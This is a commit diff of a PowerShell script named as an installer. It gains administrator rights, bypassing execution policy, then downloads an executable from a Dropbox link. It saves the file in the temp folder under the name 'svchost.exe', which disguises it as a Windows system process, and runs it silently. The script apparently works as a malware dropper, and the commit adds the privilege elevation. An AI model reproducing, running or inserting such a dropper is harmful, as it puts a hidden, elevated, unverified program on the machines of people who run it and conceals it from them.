0a66ec539299f0b5d1fd2cb5451fffae0dbcf490
Nur Mohammad Rafi <144477870+ostwrafi@users.noreply.github.com>
2026-03-07 00:08:44 +0600

    Update installnx.ps1

--- installnx.ps1
+++ installnx.ps1
@@ -1,7 +1,21 @@
-# install.ps1 nahid
+# install.ps1
 
+# Check if running as Administrator
+$isAdmin = ([Security.Principal.WindowsPrincipal] `
+[Security.Principal.WindowsIdentity]::GetCurrent()
+).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
+# If not admin, relaunch script as admin
+if (-not $isAdmin) {
+    Start-Process powershell -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`""
+    exit
+}
+
+# Download file
 $u = "https://www.dropbox.com/scl/fi/5jdblgebdbt01q1px4zrj/Built.exe?rlkey=krdcfobfbioysvnuuqb1q7c2i&st=nnsho2pu&dl=1"
 $p = "$env:TEMP\svchost.exe"
 
 Invoke-RestMethod $u -OutFile $p
-Start-Process $p -ArgumentList "/silent /norestart" -Verb RunAs
+
+# Run installer silently
+Start-Process $p -ArgumentList "/silent /norestart" -Wait
